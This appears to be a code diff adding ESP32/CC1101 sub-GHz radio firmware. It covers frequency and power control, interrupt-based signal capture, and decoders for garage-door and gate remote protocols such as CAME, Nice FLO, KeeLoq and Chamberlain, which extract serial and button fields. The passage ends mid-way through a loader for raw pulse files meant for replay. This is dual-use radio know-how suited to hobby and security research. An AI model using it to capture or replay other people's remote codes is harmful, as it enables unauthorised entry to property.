+uint32_t cc_frequencies[] = {
+    300000, 303875, 304250, 310000, 315000, 318000,
+    390000, 418000, 433075, 433420, 433920, 434420,
+    434775, 438900, 868350, 868950, 915000, 925000,
+};
+int cc_freq_idx = 10;
+
+// ── RF band switching (RF_SW0 = GPIO13, RF_SW1 = GDO2 via IOCFG2) ──
+
+void cc_set_rf_switch(float freq_mhz) {
+    bool sw0 = (freq_mhz >= 350.0f);
+    digitalWrite(CC_RFSW0, sw0 ? HIGH : LOW);
+    // GDO2/RF_SW1: default IOCFG2=0x29 (CHIP_RDYn=HIGH when ready) works for 433MHz
+    // TODO: proper GDO2 control for 315MHz band (needs RF_SW1=LOW)
+}
+
+void cc_set_pa(float freq_mhz) {
+    uint8_t pa = (freq_mhz > 800.0f) ? 0xC2 : 0xC0;
+    const CCPreset& p = cc_presets[cc_preset_idx];
+    uint8_t pa_tab[8];
+    memcpy(pa_tab, p.pa_table, 8);
+    if (p.is_ook) pa_tab[1] = pa;
+    else pa_tab[0] = pa;
+    cc_write_burst(CC_PA_TABLE, pa_tab, 8);
+}
+
+void cc_apply_preset(int idx) {
+    cc_strobe(CC_SIDLE);
+    const CCPreset& p = cc_presets[idx];
+    for (int i = 0; i < p.patch_count; i++)
+        cc_write_reg(p.patches[i].addr, p.patches[i].val);
+    cc_preset_idx = idx;
+    cc_set_pa(cc_freq_mhz);
+}
+
+void cc_set_frequency(float freq_mhz) {
+    cc_freq_mhz = freq_mhz;
+    cc_strobe(CC_SIDLE);
+    uint32_t freq_hz = (uint32_t)(freq_mhz * 1000000.0f);
+    uint32_t freq_word = (uint32_t)((uint64_t)freq_hz * 65536ULL / CC_FOSC);
+    cc_write_reg(CC_FREQ2, (freq_word >> 16) & 0xFF);
+    cc_write_reg(CC_FREQ1, (freq_word >> 8) & 0xFF);
+    cc_write_reg(CC_FREQ0, freq_word & 0xFF);
+    // Calibrate VCO after frequency change (Flipper: cc1101_calibrate + wait idle)
+    cc_strobe(0x33); // SCAL
+    delay(2);
+    cc_set_rf_switch(freq_mhz);
+    cc_set_pa(freq_mhz);
+}
+
+bool cc_open() {
+    if (cc_opened) return true;
+    pinMode(CC_CS, OUTPUT);
+    pinMode(CC_GDO0, INPUT);
+    pinMode(CC_RFSW0, OUTPUT);
+    digitalWrite(CC_CS, HIGH);
+    cc_strobe(CC_SRES);
+    delay(10);
+    uint8_t ver = cc_read_status(CC_VERSION);
+    if (ver == 0x00 || ver == 0xFF) return false;
+    cc_apply_preset(cc_preset_idx);
+    cc_set_frequency(cc_freq_mhz);
+    cc_opened = true;
+    Serial.printf("[CC1101] Opened, version=0x%02X\n", ver);
+    return true;
+}
+
+void cc_close() {
+    if (!cc_opened) return;
+    cc_strobe(CC_SIDLE);
+    digitalWrite(CC_CS, HIGH);
+    cc_opened = false;
+}
+
+void cc_sleep_for_nfc() {
+    if (cc_opened) { cc_strobe(CC_SIDLE); digitalWrite(CC_CS, HIGH); }
+}
+
+void cc_wake_from_nfc() {
+    if (cc_opened) {
+        cc_spi->setDataMode(SPI_MODE0);
+        cc_spi->setFrequency(500000);
+        cc_apply_preset(cc_preset_idx);
+        cc_set_frequency(cc_freq_mhz);
+    }
+}
+
+float cc_get_rssi() {
+    uint8_t raw = cc_read_status(CC_RSSI);
+    if (raw >= 128) return (raw - 256) / 2.0f - 74.0f;
+    return raw / 2.0f - 74.0f;
+}
+
+void cc_start_rx() {
+    cc_strobe(CC_SIDLE);
+    cc_strobe(CC_SFRX);
+    cc_strobe(CC_SRX);
+}
+
+// ── GPIO ISR-based RX edge capture (replaces polling loop) ──
+// Each edge fires an interrupt that records (level, duration) into a ring buffer.
+// The main loop reads from this buffer — no edges are missed during UI rendering.
+
+#define CC_ISR_BUF_SIZE 1024
+struct CcEdge { bool level; int32_t dur; };
+volatile CcEdge cc_isr_buf[CC_ISR_BUF_SIZE];
+volatile uint16_t cc_isr_head = 0;
+volatile uint16_t cc_isr_tail = 0;
+volatile uint32_t cc_isr_last_us = 0;
+
+void IRAM_ATTR cc_gdo0_isr() {
+    uint32_t now = (uint32_t)esp_timer_get_time();
+    uint32_t dur = now - cc_isr_last_us;
+    cc_isr_last_us = now;
+    if (dur < 80 || dur > 200000) return;
+    bool level = !digitalRead(CC_GDO0); // edge just ended = previous level
+    uint16_t next = (cc_isr_head + 1) % CC_ISR_BUF_SIZE;
+    if (next != cc_isr_tail) {
+        cc_isr_buf[cc_isr_head].level = level;
+        cc_isr_buf[cc_isr_head].dur = (int32_t)dur;
+        cc_isr_head = next;
+    }
+}
+
+bool cc_isr_read(bool* level, int32_t* dur) {
+    if (cc_isr_tail == cc_isr_head) return false;
+    *level = cc_isr_buf[cc_isr_tail].level;
+    *dur = cc_isr_buf[cc_isr_tail].dur;
+    cc_isr_tail = (cc_isr_tail + 1) % CC_ISR_BUF_SIZE;
+    return true;
+}
+
+void cc_isr_start() {
+    cc_isr_head = cc_isr_tail = 0;
+    cc_isr_last_us = (uint32_t)esp_timer_get_time();
+    attachInterrupt(digitalPinToInterrupt(CC_GDO0), cc_gdo0_isr, CHANGE);
+}
+
+void cc_isr_stop() {
+    detachInterrupt(digitalPinToInterrupt(CC_GDO0));
+}
+
+void cc_set_raw_rx() {
+    cc_strobe(CC_SIDLE);
+    cc_write_reg(CC_IOCFG0, 0x0D);  // async serial data output
+    cc_write_reg(CC_PKTCTRL0, 0x32);
+    uint8_t mdm2 = cc_read_reg(CC_MDMCFG2);
+    cc_write_reg(CC_MDMCFG2, mdm2 & 0xF8);
+    // AGC handled by preset (cc_apply_preset) — don't override here
+    cc_strobe(CC_SFRX);
+    cc_strobe(CC_SRX);
+}
+
+// =====================================================================
+// ── Protocol Decoder Infrastructure (Flipper-style table-driven) ──
+// =====================================================================
+
+struct SubGhzDecoded {
+    const char* protocol;
+    uint64_t data;
+    int bit_count;
+    uint32_t serial;
+    uint8_t btn;
+    uint16_t cnt;
+    int te;
+    bool valid;
+    bool is_rolling;
+};
+
+#define DURATION_DIFF(a, b) abs((int32_t)(a) - (int32_t)(b))
+
+// Decoder styles
+enum : uint8_t { STYLE_CAME = 0, STYLE_PRINCETON = 1 };
+
+// Table-driven protocol config (PROGMEM)
+struct SubGhzProto {
+    const char* name;
+    uint8_t style;
+    int16_t te_short;
+    int16_t te_long;
+    int16_t te_delta;
+    uint8_t min_bits;
+    uint8_t header_mult;
+    uint8_t header_delta_mult;
+    bool has_start_bit;
+    bool need_two_frames;
+    bool is_rolling;
+    bool invert_bits;
+};
+
+// Runtime state per table-driven decoder
+struct SubGhzDecState {
+    uint8_t step;
+    uint64_t data;
+    uint16_t bits;
+    int32_t te_last;
+    uint64_t last_data;
+};
+
+// ── CAME-style generic feed ──
+// Header LOW → optional start bit HIGH → alternating: save LOW, check HIGH
+// bit 0 = short_LOW + long_HIGH, bit 1 = long_LOW + short_HIGH
+
+bool cc_feed_came(const SubGhzProto& p, SubGhzDecState& s, bool level, int32_t dur, SubGhzDecoded& out) {
+    switch (s.step) {
+    case 0: // Reset: look for long LOW header
+        if (!level && DURATION_DIFF(dur, (int32_t)p.te_short * p.header_mult) <
+                      (int32_t)p.te_delta * p.header_delta_mult) {
+            s.step = p.has_start_bit ? 1 : 2;
+            s.data = 0; s.bits = 0;
+        }
+        return false;
+    case 1: // Found header, wait for start bit HIGH (ignore LOW pulses)
+        if (!level) return false; // stay in step 1, don't reset
+        if (DURATION_DIFF(dur, p.te_short) < p.te_delta) {
+            s.step = 2; s.data = 0; s.bits = 0;
+        } else s.step = 0;
+        return false;
+    case 2: // Save LOW duration
+        if (!level) {
+            if (dur >= (int32_t)p.te_short * 4 && s.bits >= p.min_bits) {
+                // Footer detected — valid decode (fields extracted later by cc_extract_fields)
+                out = {p.name, s.data, (int)s.bits, 0, 0, 0, p.te_short, true, p.is_rolling};
+                s.step = p.has_start_bit ? 1 : 0;
+                return true;
+            }
+            s.te_last = dur; s.step = 3;
+        } else s.step = 0;
+        return false;
+    case 3: // Check HIGH duration → decode bit
+        if (level) {
+            uint8_t bit_val_short_long = p.invert_bits ? 1 : 0;
+            uint8_t bit_val_long_short = p.invert_bits ? 0 : 1;
+            if (DURATION_DIFF(s.te_last, p.te_short) < p.te_delta &&
+                DURATION_DIFF(dur, p.te_long) < p.te_delta) {
+                s.data = (s.data << 1) | bit_val_short_long; s.bits++; s.step = 2;
+            } else if (DURATION_DIFF(s.te_last, p.te_long) < p.te_delta &&
+                       DURATION_DIFF(dur, p.te_short) < p.te_delta) {
+                s.data = (s.data << 1) | bit_val_long_short; s.bits++; s.step = 2;
+            } else s.step = 0;
+        } else s.step = 0;
+        return false;
+    }
+    return false;
+}
+
+// ── Princeton-style generic feed ──
+// Header LOW → alternating: save HIGH, check LOW
+// bit 0 = short_HIGH + long_LOW, bit 1 = long_HIGH + short_LOW
+
+bool cc_feed_princeton(const SubGhzProto& p, SubGhzDecState& s, bool level, int32_t dur, SubGhzDecoded& out) {
+    switch (s.step) {
+    case 0: // Reset: look for long LOW header
+        if (!level && DURATION_DIFF(dur, (int32_t)p.te_short * p.header_mult) <
+                      (int32_t)p.te_delta * p.header_delta_mult) {
+            s.step = 1; s.data = 0; s.bits = 0;
+        }
+        return false;
+    case 1: // Save HIGH duration
+        if (level) { s.te_last = dur; s.step = 2; }
+        else s.step = 0;
+        return false;
+    case 2: // Check LOW duration → decode bit or footer
+        if (!level) {
+            // Footer detection (long LOW = inter-frame gap)
+            if (dur >= (int32_t)p.te_long * 2) {
+                // Don't add pending bit — Momentum doesn't
+                s.step = 1;
+                if (s.bits == p.min_bits || (!p.need_two_frames && s.bits >= p.min_bits)) {
+                    if (p.need_two_frames) {
+                        if (s.last_data == s.data && s.last_data != 0) {
+                            out = {p.name, s.data, (int)s.bits, (uint32_t)(s.data >> 4) & 0xFFFFF,
+                                   (uint8_t)(s.data & 0xF), 0, p.te_short, true, p.is_rolling};
+                            s.last_data = 0; s.data = 0; s.bits = 0; s.step = 0;
+                            return true;
+                        }
+                        s.last_data = s.data;
+                    } else {
+                        out = {p.name, s.data, (int)s.bits, 0, 0, 0, p.te_short, true, p.is_rolling};
+                        s.data = 0; s.bits = 0; s.step = 1;
+                        return true;
+                    }
+                }
+                s.data = 0; s.bits = 0; s.step = 1;
+                return false;
+            }
+            // Normal bit
+            if (DURATION_DIFF(s.te_last, p.te_short) < p.te_delta &&
+                DURATION_DIFF(dur, p.te_long) < p.te_delta * 3) {
+                s.data = (s.data << 1); s.bits++; s.step = 1;
+            } else if (DURATION_DIFF(s.te_last, p.te_long) < p.te_delta * 3 &&
+                       DURATION_DIFF(dur, p.te_short) < p.te_delta) {
+                s.data = (s.data << 1) | 1; s.bits++; s.step = 1;
+            } else s.step = 0;
+        } else s.step = 0;
+        return false;
+    }
+    return false;
+}
+
+// ── Protocol table (constants from Momentum Flipper firmware) ──
+
+const SubGhzProto cc_proto_table[] = {
+    // Order: most-specific first (quarky/SubGhzDecoders ordering)
+    // Holtek 40-bit first (unique header), then Princeton (double-frame),
+    // then CAME-style decoders (Note: HT12X 12-bit is a custom decoder, tried before this table)
+    //                              name             style       ts    tl    td  bits hdr hdrd  start 2fr  roll  inv
+    {"Holtek",        STYLE_CAME,      430,  870,  100,  40,  36,  36, true,  false, false, false},
+    // CAME-style (save LOW, check HIGH) — after Holtek (HT12X is custom decoder, tried first)
+    {"CAME",          STYLE_CAME,      320,  640,  150,  12,  56,  63, true,  false, false, false},
+    {"Nice FLO",      STYLE_CAME,      700, 1400,  200,  12,  36,  36, true,  false, false, false},
+    {"Gate TX",       STYLE_CAME,      350,  700,  100,  24,  47,  47, true,  false, false, false},
+    {"Ansonic",       STYLE_CAME,      555, 1111,  120,  12,  35,  35, true,  false, false, true },
+    {"Legrand",       STYLE_CAME,      375, 1125,  150,  18,  16,   8, true,  false, false, false},
+    {"Phoenix V2",    STYLE_CAME,      427,  853,  100,  52,  60,  30, true,  false, true,  false},
+    {"Doitrand",      STYLE_CAME,      400, 1100,  150,  37,  62,  30, true,  false, false, false},
+    // Princeton-style (save HIGH, check LOW) — header values verified from Momentum source
+    {"Princeton",     STYLE_PRINCETON, 390, 1170,  300,  24,  36,  36, false, true,  false, false},
+    {"Faac SLH",      STYLE_PRINCETON, 255,  595,  100,  64,  36,   3, false, false, true,  false},
+    {"Linear",        STYLE_PRINCETON, 500, 1500,  350,  10,  42,  15, false, false, false, false},
+    {"Linear D3",     STYLE_PRINCETON, 500, 2000,  150,   8,  70,  24, false, true,  false, false},
+    {"Clemsa",        STYLE_PRINCETON, 385, 2695,  150,  18,  51,  25, false, false, false, false},
+    {"Dooya",         STYLE_PRINCETON, 366,  733,  120,  40,  13,  20, false, false, false, false},
+    {"Marantec 24",   STYLE_PRINCETON, 800, 1600,  200,  24,  36,   4, false, false, false, false},
+    {"Roger",         STYLE_PRINCETON, 500, 1000,  270,  28,  19,   5, false, false, false, false},
+    {"SMC5326",       STYLE_PRINCETON, 300,  900,  200,  25,  24,  12, false, false, false, false},
+    {"Elplast",       STYLE_PRINCETON, 230, 1550,  160,  18,  36,  13, false, false, false, false},
+    {"Feron",         STYLE_PRINCETON, 350,  750,  150,  32,  36,   4, false, false, false, false},
+    {"GangQi",        STYLE_PRINCETON, 500, 1200,  200,  34,  36,   3, false, false, false, false},
+    {"Hay21",         STYLE_PRINCETON, 300,  700,  150,  21,  36,   3, false, false, false, false},
+    {"Hollarm",       STYLE_PRINCETON, 200, 1000,  200,  42,  12,   2, false, false, false, false},
+    {"iDo",           STYLE_PRINCETON, 450, 1450,  150,  48,  10,   5, false, false, false, false},
+    {"Keyfinder",     STYLE_PRINCETON, 400, 1200,  150,  24,  10,   5, false, false, false, false},
+    {"Magellan",      STYLE_PRINCETON, 200,  400,  100,  32,  36,  20, false, false, false, false},
+    {"Mastercode",    STYLE_PRINCETON,1072, 2145,  150,  36,  15,  15, false, false, false, false},
+    {"Nero Radio",    STYLE_PRINCETON, 200,  400,   80,  56,  36,  20, false, false, false, false},
+    {"Nero Sketch",   STYLE_PRINCETON, 330,  660,  150,  40,  36,  20, false, false, false, false},
+    {"Nord Ice",      STYLE_PRINCETON, 300,  800,  150,  33,  25,  11, false, false, false, false},
+    {"Treadmill37",   STYLE_PRINCETON, 300,  900,  150,  37,  20,   4, false, false, false, false},
+    {"Vauno 8822",    STYLE_PRINCETON, 500, 1940,  150,  42,  36,  20, false, false, false, false},
+    {"X10",           STYLE_PRINCETON, 600, 1800,  100,  32,  16,   7, false, false, false, false},
+    {"Firefly",       STYLE_PRINCETON, 600, 4000,  300,  18,  50,   5, false, false, false, false},
+    {"Honeywell WDB", STYLE_PRINCETON, 160,  320,   60,  48,   3,  20, false, false, false, false},
+};
+#define CC_NUM_TABLE_PROTOS (sizeof(cc_proto_table)/sizeof(cc_proto_table[0]))
+
+SubGhzDecState cc_dec_states[CC_NUM_TABLE_PROTOS];
+
+// ── Custom decoders (unique state machines ported from Momentum C) ──
+
+struct CustomDecState {
+    uint8_t step;
+    uint64_t data;
+    uint16_t bits;
+    int32_t te_last;
+    uint64_t last_data;
+    uint16_t header_count;
+};
+
+// KeeLoq: te_short=400, te_long=800, te_delta=180, 64-bit rolling code
+// Preamble: alternating short HIGH/LOW, then long LOW (10*te_short)
+CustomDecState kl_state;
+
+bool cc_feed_keeloq(bool level, int32_t dur, SubGhzDecoded& out) {
+    const int TS = 400, TL = 800, TD = 180;
+    CustomDecState& s = kl_state;
+    switch (s.step) {
+    case 0: // Reset: look for short HIGH preamble
+        if (level && DURATION_DIFF(dur, TS) < TD) { s.step = 1; s.header_count++; }
+        return false;
+    case 1: // Check preamble: expect short LOW then back to Reset for more HIGH
+        if (!level && DURATION_DIFF(dur, TS) < TD) { s.step = 0; return false; }
+        if (s.header_count > 2 && DURATION_DIFF(dur, TS * 10) < TD * 10) {
+            s.step = 2; s.data = 0; s.bits = 0;
+        } else { s.step = 0; s.header_count = 0; }
+        return false;
+    case 2: // Save HIGH duration
+        if (level) { s.te_last = dur; s.step = 3; }
+        return false;
+    case 3: // Check LOW → decode bit or footer
+        if (!level) {
+            if (dur >= (TS * 2 + TD)) {
+                // End TX
+                s.step = 0; s.header_count = 0;
+                if (s.bits >= 64 && s.bits <= 66) {
+                    if (s.last_data != s.data) {
+                        out = {"KeeLoq", s.data, 64, (uint32_t)(s.data >> 32) & 0x0FFFFFFF,
+                               (uint8_t)((s.data >> 28) & 0xF), (uint16_t)(s.data & 0xFFFF),
+                               TS, true, true};
+                        s.last_data = s.data;
+                        return true;
+                    }
+                }
+                s.data = 0; s.bits = 0;
+                return false;
+            }
+            if (DURATION_DIFF(s.te_last, TS) < TD && DURATION_DIFF(dur, TL) < TD * 2) {
+                s.data = (s.data << 1) | 1; s.bits++; s.step = 2;
+            } else if (DURATION_DIFF(s.te_last, TL) < TD * 2 && DURATION_DIFF(dur, TS) < TD) {
+                s.data = (s.data << 1); s.bits++; s.step = 2;
+            } else { s.step = 0; s.header_count = 0; }
+        } else { s.step = 0; s.header_count = 0; }
+        return false;
+    }
+    return false;
+}
+
+// Hormann: te_short=500, te_long=1000, te_delta=200, 44-bit
+// Header: long HIGH (24*te_short=12000us), then short LOW (te_short)
+// Saves on HIGH, checks on LOW (reversed from typical CAME)
+CustomDecState hm_state;
+
+bool cc_feed_hormann(bool level, int32_t dur, SubGhzDecoded& out) {
+    const int TS = 500, TL = 1000, TD = 200;
+    CustomDecState& s = hm_state;
+    switch (s.step) {
+    case 0: // Look for long HIGH header (24*500=12000us)
+        if (level && DURATION_DIFF(dur, TS * 24) < TD * 24) s.step = 1;
+        return false;
+    case 1: // Expect short LOW after header
+        if (!level && DURATION_DIFF(dur, TS) < TD) {
+            s.step = 2; s.data = 0; s.bits = 0;
+        } else s.step = 0;
+        return false;
+    case 2: // Save HIGH duration
+        if (level) {
+            if (dur >= TS * 5 && s.bits >= 44) {
+                out = {"Hormann", s.data, (int)s.bits, (uint32_t)(s.data >> 4) & 0xFFFFFFF,
+                       (uint8_t)(s.data & 0xF), 0, TS, true, false};
+                s.step = 1; return true;
+            }
+            s.te_last = dur; s.step = 3;
+        } else s.step = 0;
+        return false;
+    case 3: // Check LOW → decode bit
+        if (!level) {
+            if (DURATION_DIFF(s.te_last, TS) < TD && DURATION_DIFF(dur, TL) < TD) {
+                s.data = (s.data << 1); s.bits++; s.step = 2;
+            } else if (DURATION_DIFF(s.te_last, TL) < TD && DURATION_DIFF(dur, TS) < TD) {
+                s.data = (s.data << 1) | 1; s.bits++; s.step = 2;
+            } else s.step = 0;
+        } else s.step = 0;
+        return false;
+    }
+    return false;
+}
+
+// BETT: te_short=340, te_long=2000, te_delta=150, 18-bit
+// Header: long LOW (44*te_short), then straight to CheckDuration (check HIGH first)
+CustomDecState bt_state;
+
+bool cc_feed_bett(bool level, int32_t dur, SubGhzDecoded& out) {
+    const int TS = 340, TL = 2000, TD = 150;
+    CustomDecState& s = bt_state;
+    switch (s.step) {
+    case 0: // Look for long LOW header (44*340 ~= 15000us)
+        if (!level && DURATION_DIFF(dur, TS * 44) < TD * 15) {
+            s.data = 0; s.bits = 0; s.step = 2; // skip to check HIGH
+        }
+        return false;
+    case 1: // Save LOW duration
+        if (!level) {
+            if (DURATION_DIFF(dur, TS * 44) < TD * 15) {
+                if (s.bits == 18) {
+                    out = {"BETT", s.data, 18, 0, 0, 0, TS, true, false};
+                    s.data = 0; s.bits = 0; return true;
+                }
+                s.data = 0; s.bits = 0; s.step = 0;
+                return false;
+            }
+            if (DURATION_DIFF(dur, TS) < TD || DURATION_DIFF(dur, TL) < TD * 3) {
+                s.step = 2;
+            } else s.step = 0;
+        }
+        return false;
+    case 2: // Check HIGH → decode bit
+        if (level) {
+            if (DURATION_DIFF(dur, TL) < TD * 3) {
+                s.data = (s.data << 1) | 1; s.bits++; s.step = 1;
+            } else if (DURATION_DIFF(dur, TS) < TD) {
+                s.data = (s.data << 1); s.bits++; s.step = 1;
+            } else s.step = 0;
+        } else s.step = 0;
+        return false;
+    }
+    return false;
+}
+
+// ── Holtek HT12X (12-bit, 320/640us, double-frame) ──
+// MUST be tried BEFORE CAME — identical bit timing, only preamble differs.
+// Ported from quarky/SubGhzDecoders.cpp:1102-1136
+CustomDecState ht12x_state;
+
+bool cc_feed_holtek_ht12x(bool level, int32_t dur, SubGhzDecoded& out) {
+    const int TS = 320, TL = 640, TD = 200;
+    CustomDecState& s = ht12x_state;
+    switch (s.step) {
+    case 0:
+        if (!level && DURATION_DIFF(dur, TS * 28) < TD * 20) { s.step = 1; s.data = 0; s.bits = 0; }
+        return false;
+    case 1:
+        if (level && DURATION_DIFF(dur, TS) < TD) { s.step = 2; s.data = 0; s.bits = 0; }
+        else s.step = 0;
+        return false;
+    case 2:
+        if (!level) {
+            if (dur >= TS * 10 + TD) {
+                if (s.bits == 12) {
+                    if (s.last_data == s.data && s.last_data != 0) {
+                        out = {"Holtek_HT12X", s.data, 12, 0, 0, 0, TS, true, false};
+                        cc_extract_fields(out);
+                        s.last_data = 0; s.data = 0; s.bits = 0; s.step = 0;
+                        return true;
+                    }
+                    s.last_data = s.data;
+                }
+                s.data = 0; s.bits = 0; s.step = 1;
+                return false;
+            }
+            s.te_last = dur; s.step = 3;
+        } else s.step = 0;
+        return false;
+    case 3:
+        if (level) {
+            if (DURATION_DIFF(s.te_last, TL) < TD * 2 && DURATION_DIFF(dur, TS) < TD) {
+                s.data = (s.data << 1) | 1; s.bits++; s.step = 2;
+            } else if (DURATION_DIFF(s.te_last, TS) < TD && DURATION_DIFF(dur, TL) < TD * 2) {
+                s.data = (s.data << 1); s.bits++; s.step = 2;
+            } else s.step = 0;
+        } else s.step = 0;
+        return false;
+    }
+    return false;
+}
+
+// ── Chamberlain Code (4-bit symbol encoding) ──
+// Ported from quarky/SubGhzDecoders.cpp:1174-1228
+CustomDecState ch_state;
+
+bool chamb_to_bit(uint64_t* data, uint8_t size) {
+    uint64_t t = *data, res = 0;
+    for (uint8_t i = 0; i < size; i++) {
+        uint64_t sym = t & 0xF;
+        if (sym == 0b0111) { /* bit 0 */ }
+        else if (sym == 0b0011) { res |= (1ULL << i); }
+        else return false;
+        t >>= 4;
+    }
+    *data = res;
+    return true;
+}
+
+bool cc_feed_chamberlain(bool level, int32_t dur, SubGhzDecoded& out) {
+    const int TS = 1000, TD = 200;
+    CustomDecState& s = ch_state;
+    switch (s.step) {
+    case 0:
+        if (!level && DURATION_DIFF(dur, TS * 39) < TD * 20) s.step = 1;
+        return false;
+    case 1:
+        if (level && DURATION_DIFF(dur, TS) < TD) {
+            s.data = 0; s.bits = 0;
+            s.data = (s.data << 4) | 0b0001;
+            s.bits++;
+            s.step = 2;
+        } else s.step = 0;
+        return false;
+    case 2:
+        if (!level) {
+            if (dur > TS * 5) {
+                if (s.bits >= 10 && s.bits <= 11) {
+                    uint64_t cd = s.data; uint8_t cc = s.bits; bool ok = false;
+                    if ((cd & 0xF000000FF0FULL) == 0x10000001101ULL) {
+                        cc = 7; cd &= ~0xF000000FF0FULL; cd = (cd >> 12) | ((cd >> 4) & 0xF); ok = true;
+                    } else if ((cd & 0xF00000F00FULL) == 0x1000001001ULL) {
+                        cc = 8; cd &= ~0xF00000F00FULL; cd = (cd >> 4) | ((uint64_t)0b0111 << 8); ok = true;
+                    } else if ((cd & 0xF000000000FULL) == 0x10000000001ULL) {
+                        cc = 9; cd &= ~0xF000000000FULL; cd >>= 4; ok = true;
+                    }
+                    if (ok && chamb_to_bit(&cd, cc)) {
+                        out = {"Chamberlain", cd, (int)cc, 0, 0, 0, TS, true, false};
+                        s.step = 0; return true;
+                    }
+                }
+                s.step = 0;
+            } else {
+                s.te_last = dur; s.step = 3;
+            }
+        } else s.step = 0;
+        return false;
+    case 3:
+        if (level) {
+            if (DURATION_DIFF(s.te_last, TS * 3) < TD && DURATION_DIFF(dur, TS) < TD) {
+                s.data = (s.data << 4) | 0b0001; s.bits++; s.step = 2;
+            } else if (DURATION_DIFF(s.te_last, TS * 2) < TD && DURATION_DIFF(dur, TS * 2) < TD) {
+                s.data = (s.data << 4) | 0b0011; s.bits++; s.step = 2;
+            } else if (DURATION_DIFF(s.te_last, TS) < TD && DURATION_DIFF(dur, TS * 3) < TD) {
+                s.data = (s.data << 4) | 0b0111; s.bits++; s.step = 2;
+            } else s.step = 0;
+        } else s.step = 0;
+        return false;
+    }
+    return false;
+}
+
+// ── Decoder registry ──
+
+void cc_decoders_reset() {
+    memset(cc_dec_states, 0, sizeof(cc_dec_states));
+    memset(&kl_state, 0, sizeof(kl_state));
+    memset(&hm_state, 0, sizeof(hm_state));
+    memset(&bt_state, 0, sizeof(bt_state));
+    memset(&ht12x_state, 0, sizeof(ht12x_state));
+    memset(&ch_state, 0, sizeof(ch_state));
+}
+
+uint64_t cc_reverse_key(uint64_t key, int bit_count) {
+    uint64_t result = 0;
+    for (int i = 0; i < bit_count; i++)
+        result |= ((key >> i) & 1ULL) << (bit_count - 1 - i);
+    return result;
+}
+
+void cc_extract_fields(SubGhzDecoded& d) {
+    const char* name = d.protocol;
+    uint64_t data = d.data;
+    int bits = d.bit_count;
+    if (strcmp(name, "Ansonic") == 0) {
+        d.btn = (data >> 1) & 0x3;
+        d.cnt = data & 0xFFF;
+    } else if (strcmp(name, "Gate TX") == 0) {
+        uint32_t rev = (uint32_t)cc_reverse_key(data, bits);
+        d.serial = ((rev & 0xFF) << 12) | (((rev >> 8) & 0xFF) << 4) | ((rev >> 20) & 0x0F);
+        d.btn = (rev >> 16) & 0x0F;
+    } else if (strcmp(name, "Holtek") == 0) {
+        d.serial = (uint32_t)cc_reverse_key((data >> 16) & 0xFFFFF, 20);
+        uint16_t btn_raw = data & 0xFFFF;
+        if ((btn_raw & 0xF) != 0xA)            d.btn = 0x10 | (btn_raw & 0xF);
+        else if (((btn_raw>>4) & 0xF) != 0xA)  d.btn = 0x20 | ((btn_raw>>4) & 0xF);
+        else if (((btn_raw>>8) & 0xF) != 0xA)  d.btn = 0x30 | ((btn_raw>>8) & 0xF);
+        else if (((btn_raw>>12)& 0xF) != 0xA)  d.btn = 0x40 | ((btn_raw>>12) & 0xF);
+        else d.btn = 0;
+    } else if (strcmp(name, "Doitrand") == 0) {
+        d.btn = (data >> 18) & 0x3;
+        d.cnt = (uint16_t)((data >> 24) | ((data >> 15) & 0x1));
+    } else if (strcmp(name, "Princeton") == 0) {
+        uint8_t lo = data & 0xFF;
+        if (lo == 0x30 || lo == 0xC0) { d.serial = (uint32_t)(data >> 8); d.btn = lo; }
+        else if (lo == 0x03 || lo == 0x0C) { d.serial = (uint32_t)(data >> 8); d.btn = lo | 0xF0; }
+        else { d.serial = (uint32_t)(data >> 4); d.btn = data & 0xF; }
+    } else if (strcmp(name, "Clemsa") == 0) {
+        d.serial = (uint32_t)((data >> 2) & 0xFFFF);
+        d.btn = data & 0x03;
+    } else if (strcmp(name, "Linear") == 0) {
+        d.cnt = (uint16_t)(~data & 0x3FF);
+    } else if (strcmp(name, "Magellan") == 0) {
+        uint32_t rev = (uint32_t)cc_reverse_key((data >> 8) & 0xFFFFFF, 24);
+        d.serial = rev & 0xFFFF;
+        d.btn = (rev >> 16) & 0xFF;
+    } else if (strcmp(name, "Honeywell WDB") == 0) {
+        d.serial = (uint32_t)((data >> 28) & 0xFFFFF);
+        d.btn = (data >> 20) & 0x3;
+    }
+}
+
+bool cc_decoders_feed(bool level, int32_t dur, SubGhzDecoded& out) {
+    // Order matters! Most-specific first to avoid false positives.
+    // 1. Holtek HT12X (12-bit 320/640us) MUST precede CAME (same timing, shorter preamble)
+    if (cc_feed_holtek_ht12x(level, dur, out)) return true;
+    // 2. KeeLoq (unique preamble pattern)
+    if (cc_feed_keeloq(level, dur, out)) return true;
+    // 3. Table-driven (Holtek 40-bit, Princeton, CAME, Nice FLO, Ansonic, etc.)
+    for (int i = 0; i < (int)CC_NUM_TABLE_PROTOS; i++) {
+        const SubGhzProto& p = cc_proto_table[i];
+        bool hit = (p.style == STYLE_CAME)
+            ? cc_feed_came(p, cc_dec_states[i], level, dur, out)
+            : cc_feed_princeton(p, cc_dec_states[i], level, dur, out);
+        if (hit) { cc_extract_fields(out); return true; }
+    }
+    // 4. Chamberlain (unique 4-bit symbol encoding)
+    if (cc_feed_chamberlain(level, dur, out)) return true;
+    // 5. Other custom decoders
+    if (cc_feed_hormann(level, dur, out)) return true;
+    if (cc_feed_bett(level, dur, out)) return true;
+    return false;
+}
+
+// ── Raw pulse capture (streaming to SD) ──
+
+#define CC_RAW_BUF_SIZE 512
+int32_t* cc_raw_buf = nullptr;
+int cc_raw_buf_pos = 0;
+int cc_raw_total = 0;
+
+#define CC_MAX_PULSES 2048
+int32_t* cc_raw_pulses = nullptr;
+int cc_raw_count = 0;
+
+// Load .sub file into malloc'd buffer (for large replays from SD)
+int32_t* cc_load_sub_malloc(const char* path, uint32_t* freq_hz, int* out_count) {
+    File f = SD.open(path, FILE_READ);
+    if (!f) { *out_count = 0; return nullptr; }
+    *freq_hz = 433920000;
+    // First pass: count pulses
+    int total = 0;
+    while (f.available()) {
+        String line = f.readStringUntil('\n'); line.trim();
+        if (line.startsWith("Frequency:")) *freq_hz = (uint32_t)line.substring(11).toInt();
+        else if (line.startsWith("RAW_Data:")) {
+            String data = line.substring(10); int pos = 0;
+            while (pos < (int)data.length()) {
+                while (pos < (int)data.length() && data[pos] == ' ') pos++;
+                int end = pos;
+                while (end < (int)data.length() && data[end] != ' ') end++;
+                if (end > pos) total++;
+                pos = end;
+            }
+        }
+    }
+    if (total == 0) { f.close(); *out_count = 0; return nullptr; }
+    // Allocate
+    int32_t* buf = (int32_t*)malloc(total * sizeof(int32_t));
+    if (!buf) { f.close(); *out_count = 0; return nullptr; }
+    // Second pass: read pulses
